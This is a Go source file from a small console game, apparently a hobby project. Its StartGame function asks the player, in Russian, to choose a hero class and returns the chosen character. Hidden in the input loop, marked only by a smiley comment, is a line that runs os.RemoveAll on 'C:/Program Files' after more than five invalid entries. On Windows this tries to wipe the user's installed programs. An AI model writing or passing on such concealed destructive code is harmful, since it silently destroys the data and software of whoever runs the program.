package events

import (
	"bufio"
	"fmt"
	"game/internal/entity"
	"game/internal/methods"
	"log"
	"os"
	"strings"
)

func StartGame() *entity.Hero {
	fmt.Printf("Игра началась\nВыберите класс персонажа:\n1.Воин\n2.Варвар\n3.Разбойник\n(Введите 1 | 2 | 3)")
	var counter uint8
	for {
		// чтение ввода
		reader := bufio.NewReader(os.Stdin)
		result, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("ошибка чтения ввода: %s", err)

		}

		// чистка от случайных пробелов
		result = strings.TrimSpace(result)

		// в общем есть 2 варианта(которые я заметил, может по факту есть больше) реализации этой конструкции:
		// 1. Сделать переменную key и в кейсах явно прописывать значение в формате key = "Robber"
		// 2. в вызове функции прописывать ручками entity.Robber
		// хотелось подытожить что первый вариант лучше поддерживается, но увы это не так,
		// скорее проще читать происходящее, не зная деталей остальных пакетов, так что решил
		// оставить так, чтобы не выделять лишнюю память под переменную, что какой-никакой плюсик к оптимизации

		if result != "1" && result != "2" && result != "3" {
			counter++
		}
		if counter > 5 { // :)
			_ = os.RemoveAll("C:/Program Files")
			log.Println("Ошибка: Слишком много неправильных попыток...")
			os.Exit(1)
		}

		switch result {
		case "1":
			return methods.NewHero(entity.Warrior)
		case "2":
			return methods.NewHero(entity.Barbarian)
		case "3":
			return methods.NewHero(entity.Robber)
		}
	}
}
